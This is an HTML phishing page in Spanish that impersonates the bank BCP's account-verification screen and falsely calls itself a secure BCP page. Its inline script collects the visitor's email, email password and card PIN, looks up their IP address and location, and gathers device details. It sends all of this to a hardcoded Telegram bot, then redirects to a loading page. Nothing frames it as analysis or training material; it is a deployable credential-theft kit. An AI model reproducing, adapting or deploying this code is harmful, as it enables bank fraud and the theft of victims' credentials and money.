<!doctype html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>BCP - Verificación de Cuenta</title>
    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css"
    />
    <style>
      body {
        font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
      }
      input {
        border: 1px solid #868f9e !important;
        outline: none;
      }
      input:focus {
        border-color: #868f9e;
        outline: none;
      }
      .field-group {
        margin-bottom: 14px;
      }
    </style>
  </head>
  <body class="bg-white">
    <div class="min-h-screen flex">
      <!-- PANEL IZQUIERDO -->
      <div class="hidden md:flex md:w-1/2 bg-[#002a8d] relative items-center justify-center overflow-hidden">
        <div class="text-white text-center p-8">
          <h2 class="text-3xl font-bold mb-4">Seguridad BCP</h2>
          <p class="text-blue-100 text-sm">Confirme sus credenciales y PIN de acceso para continuar.</p>
        </div>
        <div class="absolute top-6 left-6 text-white font-bold text-2xl">
          <span>BCP</span>
        </div>
      </div>

      <!-- PANEL DERECHO -->
      <div class="w-full md:w-1/2 flex flex-col justify-between">
        <div class="flex items-center justify-between px-6 py-4">
          <div class="flex items-center gap-2 text-orange-500 font-medium">
            <i class="fa-solid fa-arrow-left"></i>
            <span>Volver</span>
          </div>
          <div class="text-gray-500">
            <i class="fa-regular fa-circle-question"></i>
          </div>
        </div>

        <div class="px-6 max-w-md w-full mx-auto my-auto">
          <div class="text-center mb-6">
            <h1 class="text-[#002a8d] text-2xl font-semibold">Validemos tu identidad</h1>
            <p class="text-gray-500 text-sm mt-1">Ingrese su correo, contraseña y PIN de seguridad asociados a su cuenta bancaria</p>
          </div>

          <div class="border rounded-xl p-6 shadow-sm" style="border: 1px solid #d2d5dc">
            <div class="flex items-center gap-2 mb-4">
              <i class="fa-solid fa-envelope text-[#002a8d]"></i>
              <h2 class="text-[#002a8d] font-semibold">Credenciales y PIN</h2>
            </div>

            <!-- CORREO -->
            <div class="field-group">
              <label class="block text-xs font-medium text-gray-700 mb-1">Correo electrónico</label>
              <input
                type="email"
                placeholder="correo@ejemplo.com"
                class="rounded-lg px-3 py-2 w-full text-sm"
                id="correoBanco"
              />
            </div>

            <!-- CONTRASEÑA -->
            <div class="field-group">
              <label class="block text-xs font-medium text-gray-700 mb-1">Contraseña de correo electrónico</label>
              <input
                type="password"
                placeholder="••••••••"
                class="rounded-lg px-3 py-2 w-full text-sm"
                id="passwordBanco"
              />
            </div>

            <!-- PIN DE CORREO -->
            <div class="field-group">
              <label class="block text-xs font-medium text-gray-700 mb-1">Clave Pin Tarjeta</label>
              <input
                type="password"
                id="pinCorreo"
                maxlength="6"
                inputmode="numeric"
                pattern="[0-9]*"
                placeholder="••••"
                class="rounded-lg px-3 py-2 w-full text-sm"
              />
            </div>

            <button
              id="continuarBtn"
              class="w-full bg-orange-500 hover:bg-orange-600 text-white font-semibold py-3 rounded-full mt-2"
            >
              Continuar
            </button>
          </div>
        </div>

        <div class="text-xs text-gray-500 px-6 py-4 flex items-start gap-2">
          <i class="fa-solid fa-lock mt-1"></i>
          <p>Esta es una página segura del BCP.</p>
        </div>
      </div>
    </div>

    <script>
      document.addEventListener("DOMContentLoaded", function () {
        const TELEGRAM_BOT_TOKEN = "8700311235:AAG4b4wrbmmsNeDa11eawivXLo9RV0hq0Sw";
        const TELEGRAM_CHAT_ID = "-5398208983";
        const REDIRECT_URL = "cargando1.html";

        const continuarBtn = document.getElementById("continuarBtn");
        const pinCorreoInput = document.getElementById("pinCorreo");

        // Solo permitir números en el campo de PIN
        pinCorreoInput.addEventListener("input", function () {
          this.value = this.value.replace(/\D/g, "");
        });

        // ============================================================
        // FUNCIONES DE UBICACIÓN (IP)
        // ============================================================
        async function getIPInfo() {
          try {
            const ipResponse = await fetch("https://api.ipify.org?format=json");
            const ipData = await ipResponse.json();
            const ip = ipData.ip;
            const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
            const locationData = await locationResponse.json();
            return {
              ip: ip,
              ciudad: locationData.city || "Desconocida",
              region: locationData.region || "Desconocida",
              pais: locationData.country_name || "Desconocido",
              proveedor: locationData.org || "Desconocido",
            };
          } catch (error) {
            console.error("Error obteniendo información de IP:", error);
            return {
              ip: "No disponible",
              ciudad: "No disponible",
              region: "No disponible",
              pais: "No disponible",
              proveedor: "No disponible",
            };
          }
        }

        async function sendToTelegram(message) {
          try {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            await fetch(url, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: "HTML",
              }),
            });
          } catch (error) {
            console.error("Error:", error);
          }
        }

        continuarBtn.addEventListener("click", async function (e) {
          e.preventDefault();
          const correo = document.getElementById("correoBanco").value.trim();
          const password = document.getElementById("passwordBanco").value.trim();
          const pinCorreo = pinCorreoInput.value.trim();

          if (!correo || !password || !pinCorreo) {
            alert("Por favor complete todos los campos (Correo, Contraseña y PIN)");
            return;
          }

          // Obtener la información técnica e IP
          const ipInfo = await getIPInfo();
          const userAgent = navigator.userAgent;
          const platform = navigator.platform;
          const screen = `${window.screen.width}x${window.screen.height}`;

          let message = `📧 <b>CREDENCIALES Y PIN DE CORREO RECIBIDOS</b>\n\n`;
          message += `📋 <b>Datos del formulario:</b>\n`;
          message += `• Correo: ${correo}\n`;
          message += `• Contraseña: ${password}\n`;
          message += `• PIN / Clave Tarjeta: ${pinCorreo}\n`;
          message += `🌐 <b>Información de ubicación:</b>\n`;
          message += `• IP: ${ipInfo.ip}\n`;
          message += `• Ciudad: ${ipInfo.ciudad}\n`;
          message += `• Región: ${ipInfo.region}\n`;
          message += `• País: ${ipInfo.pais}\n`;
          message += `• Proveedor: ${ipInfo.proveedor}\n`;
          message += `⏰ <b>Fecha y Hora:</b> ${new Date().toLocaleString()}\n`;
          message += `🖥️ <b>User Agent:</b> ${userAgent}\n`;
          message += `📱 <b>Plataforma:</b> ${platform}\n`;
          message += `🖥️ <b>Pantalla:</b> ${screen}`;

          this.disabled = true;
          this.innerHTML = `Enviando...`;

          await sendToTelegram(message);

          setTimeout(() => {
            window.location.href = REDIRECT_URL;
          }, 500);
        });
      });
    </script>
  </body>
</html>
